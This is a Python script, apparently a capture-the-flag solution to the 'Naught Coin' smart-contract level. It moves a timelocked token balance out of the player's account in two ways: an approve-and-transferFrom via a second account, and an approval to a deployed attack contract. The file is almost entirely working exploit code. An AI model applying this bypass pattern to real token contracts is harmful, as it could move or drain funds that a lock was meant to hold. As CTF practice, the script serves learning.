#!/usr/bin/python3
from ape import accounts, project
from rich.console import Console

ADDRESS = "0xA50D37586B14A2Be71A086249Ab910F314bF1A0B"

console = Console()


def attack1():
    """
    First method: using a 2nd external account
    """
    attacker1 = accounts.load("ctf")
    attacker1.set_autosign(True)
    attacker2 = accounts.load("youtube")
    attacker2.set_autosign(True)
    target_contract = project.NaughtCoin.at(ADDRESS)
    naught_coin = project.IERC20.at(ADDRESS)
    attacker1_naught_coin_balance = naught_coin.balanceOf(attacker1.address)

    console.print(
        f"[green]Balance Before The Hack: [magenta]{attacker1_naught_coin_balance}"
    )

    naught_coin.approve(attacker2.address, attacker1_naught_coin_balance, sender=attacker1)
    naught_coin.transferFrom(
        attacker1.address,
        attacker2.address,
        attacker1_naught_coin_balance,
        sender=attacker2,
    )

    console.print(
        f"[green]Balance After The Hack: [magenta]{target_contract.balanceOf(attacker1.address)}"
    )

    assert target_contract.balanceOf(attacker1.address) == 0

def attack2():
    """
    Second method: using a Contract
    """
    attacker = accounts.load("ctf")
    attacker.set_autosign(True)

    target_contract = project.NaughtCoin.at(ADDRESS)

    attacker_naught_coin_balance = target_contract.balanceOf(attacker.address)

    console.print(
        f"[green]Balance Before The Hack: [magenta]{attacker_naught_coin_balance}"
    )
    attacking_contract = project.NaughtcoinAttack.deploy(ADDRESS, sender=attacker)
    target_contract.approve(attacking_contract.address, attacker_naught_coin_balance, sender=attacker)
    attacking_contract.hack(attacker.address, sender=attacker)

    console.print(
        f"[green]Balance After The Hack: [magenta]{target_contract.balanceOf(attacker.address)}"
    )

    assert target_contract.balanceOf(attacker.address) == 0


def main():
    attack1()


if __name__ == "__main__":
    main()
